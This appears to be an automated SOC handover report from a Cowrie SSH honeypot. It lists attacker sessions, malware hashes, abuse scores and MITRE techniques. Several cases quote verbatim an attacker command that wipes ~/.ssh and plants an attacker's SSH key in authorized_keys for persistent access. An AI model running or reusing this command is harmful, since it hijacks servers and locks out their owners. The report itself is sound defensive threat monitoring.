| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:34 |
| **Last Seen** | 2026-04-18 09:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:34:04` | `cowrie.session.connect` |
| `2026-04-18 09:34:04` | `cowrie.client.version` |
| `2026-04-18 09:34:04` | `cowrie.client.kex` |
| `2026-04-18 09:34:04` | `cowrie.login.success` |
| `2026-04-18 09:34:05` | `cowrie.session.params` |
| `2026-04-18 09:34:05` | `cowrie.command.input` |
| `2026-04-18 09:34:05` | `cowrie.command.failed` |
| `2026-04-18 09:34:05` | `cowrie.log.closed` |
| `2026-04-18 09:34:05` | `cowrie.session.params` |
| `2026-04-18 09:34:05` | `cowrie.command.input` |
| `2026-04-18 09:34:05` | `cowrie.session.file_download` |
| `2026-04-18 09:34:05` | `cowrie.log.closed` |
| `2026-04-18 09:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71770043615a

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:34 |
| **Last Seen** | 2026-04-18 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:34:07` | `cowrie.session.connect` |
| `2026-04-18 09:34:07` | `cowrie.client.version` |
| `2026-04-18 09:34:07` | `cowrie.client.kex` |
| `2026-04-18 09:34:07` | `cowrie.login.success` |
| `2026-04-18 09:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d851e619a0

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:34 |
| **Last Seen** | 2026-04-18 09:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:34:50` | `cowrie.session.connect` |
| `2026-04-18 09:34:50` | `cowrie.client.version` |
| `2026-04-18 09:34:51` | `cowrie.client.kex` |
| `2026-04-18 09:34:51` | `cowrie.login.success` |
| `2026-04-18 09:34:51` | `cowrie.session.params` |
| `2026-04-18 09:34:51` | `cowrie.command.input` |
| `2026-04-18 09:34:51` | `cowrie.command.failed` |
| `2026-04-18 09:34:51` | `cowrie.log.closed` |
| `2026-04-18 09:34:51` | `cowrie.session.params` |
| `2026-04-18 09:34:51` | `cowrie.command.input` |
| `2026-04-18 09:34:52` | `cowrie.session.file_download` |
| `2026-04-18 09:34:52` | `cowrie.log.closed` |
| `2026-04-18 09:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b507bf137dde

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:34 |
| **Last Seen** | 2026-04-18 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:34:53` | `cowrie.session.connect` |
| `2026-04-18 09:34:53` | `cowrie.client.version` |
| `2026-04-18 09:34:53` | `cowrie.client.kex` |
| `2026-04-18 09:34:53` | `cowrie.login.success` |
| `2026-04-18 09:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3027247890d

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:39 |
| **Last Seen** | 2026-04-18 09:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:39:27` | `cowrie.session.connect` |
| `2026-04-18 09:39:27` | `cowrie.client.version` |
| `2026-04-18 09:39:27` | `cowrie.client.kex` |
| `2026-04-18 09:39:28` | `cowrie.login.success` |
| `2026-04-18 09:39:28` | `cowrie.session.params` |
| `2026-04-18 09:39:28` | `cowrie.command.input` |
| `2026-04-18 09:39:28` | `cowrie.command.failed` |
| `2026-04-18 09:39:28` | `cowrie.log.closed` |
| `2026-04-18 09:39:28` | `cowrie.session.params` |
| `2026-04-18 09:39:28` | `cowrie.command.input` |
| `2026-04-18 09:39:28` | `cowrie.session.file_download` |
| `2026-04-18 09:39:28` | `cowrie.log.closed` |
| `2026-04-18 09:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d777be73e64

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:39 |
| **Last Seen** | 2026-04-18 09:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:39:30` | `cowrie.session.connect` |
| `2026-04-18 09:39:30` | `cowrie.client.version` |
| `2026-04-18 09:39:30` | `cowrie.client.kex` |
| `2026-04-18 09:39:31` | `cowrie.login.success` |
| `2026-04-18 09:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006ddaebe356

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:44 |
| **Last Seen** | 2026-04-18 09:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:44:08` | `cowrie.session.connect` |
| `2026-04-18 09:44:08` | `cowrie.client.version` |
| `2026-04-18 09:44:08` | `cowrie.client.kex` |
| `2026-04-18 09:44:08` | `cowrie.login.success` |
| `2026-04-18 09:44:08` | `cowrie.session.params` |
| `2026-04-18 09:44:08` | `cowrie.command.input` |
| `2026-04-18 09:44:08` | `cowrie.command.failed` |
| `2026-04-18 09:44:08` | `cowrie.log.closed` |
| `2026-04-18 09:44:08` | `cowrie.session.params` |
| `2026-04-18 09:44:08` | `cowrie.command.input` |
| `2026-04-18 09:44:08` | `cowrie.session.file_download` |
| `2026-04-18 09:44:08` | `cowrie.log.closed` |
| `2026-04-18 09:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847fa9d8de19

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:44 |
| **Last Seen** | 2026-04-18 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:44:10` | `cowrie.session.connect` |
| `2026-04-18 09:44:10` | `cowrie.client.version` |
| `2026-04-18 09:44:10` | `cowrie.client.kex` |
| `2026-04-18 09:44:10` | `cowrie.login.success` |
| `2026-04-18 09:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8e9ba0ddb0

| Field | Detail |
|---|---|
| **Source IP** | `51.89.1[.]86` |
| **First Seen** | 2026-04-18 10:01 |
| **Last Seen** | 2026-04-18 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 10:01:57` | `cowrie.session.connect` |
| `2026-04-18 10:01:57` | `cowrie.client.version` |
| `2026-04-18 10:01:57` | `cowrie.client.kex` |
| `2026-04-18 10:01:57` | `cowrie.login.success` |
| `2026-04-18 10:01:58` | `cowrie.session.params` |
| `2026-04-18 10:01:58` | `cowrie.command.input` |
| `2026-04-18 10:01:58` | `cowrie.log.closed` |
| `2026-04-18 10:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.89.1[.]86` to AbuseIPDB if not already reported
- [ ] Block `51.89.1[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.243.26[.]174` | **25** | 2026-04-18 08:57 | 2026-04-18 09:35 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.12.41[.]6` | **25** | 2026-04-18 08:57 | 2026-04-18 09:37 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.215.80[.]173` | **21** | 2026-04-18 08:59 | 2026-04-18 09:53 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **4** | 2026-04-18 10:36 | 2026-04-18 10:40 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `101.89.148[.]7` | **2** | 2026-04-18 09:03 | 2026-04-18 09:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `113.193.234[.]210` | 1 | 2026-04-18 08:59 | 2026-04-18 08:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-18 09:58 | 2026-04-18 09:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `51.89.1[.]86` | 1 | 2026-04-18 09:56 | 2026-04-18 09:56 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.243.26[.]174` | HK | HongKong Virtual Internal Server Company Limited | **100** ⚠️ | 50 |
| `101.89.148[.]7` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `51.89.1[.]86` | DE | OVH GmbH | **100** ⚠️ | 50 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `103.215.80[.]173` | HK | Asia Pacific Network Information Centre | **100** ⚠️ | 50 |
| `20.12.41[.]6` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `113.193.234[.]210` | IN | Tikona Infinet Ltd. | **100** ⚠️ | 50 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 0 |
| `72.255.18[.]119` | PK | Cyber Internet Services Pakistan | **32** | 0 |
| `52.159.247[.]67` | US | Microsoft Corporation | **30** | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 128 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 74 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 157 cases |
| Tool 34  | Credential Extractor        | ✅ 133 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (14.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 55 priority case(s) shown individually · 8 recon entry/entries in table (5 group(s) consolidating 77 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-18T10:46:24Z_
